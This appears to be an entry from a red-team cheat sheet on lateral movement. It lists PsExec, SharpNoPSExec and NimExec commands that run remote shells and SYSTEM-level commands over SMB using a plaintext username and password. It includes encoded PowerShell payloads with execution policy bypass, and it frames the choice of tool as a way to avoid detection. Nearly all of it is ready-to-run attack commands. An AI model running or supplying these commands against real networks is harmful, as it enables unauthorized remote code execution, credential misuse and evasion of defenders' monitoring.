# 05.05 PsExec Variants

> Pick a PsExec variant by detection profile — `NimExec` and `SharpNoPSExec` hijack stopped services to skip PSEXESVC creation.

## Overview

Multiple PsExec implementations for SMB-based code execution. NimExec and SharpNoPSExec avoid the classic PSEXESVC service creation for evasion.

## Steps

- **PsExec.exe -s** — run as SYSTEM.
- **SharpNoPSExec** — service-less exec via existing service binary path.
- **NimExec** — Nim-based PsExec alternative.

## Commands

### PsExec.exe

```powershell
.\PsExec.exe \\SRV02 -i -u <DOMAIN>\helen -p RedRiot88 cmd
.\PsExec.exe \\SRV02 -i -s -u <DOMAIN>\helen -p RedRiot88 cmd
```

### SharpNoPSExec + NimExec

```powershell
.\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e BASE64"
.\NimExec -u helen -d <DOMAIN>.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e BASE64"
```
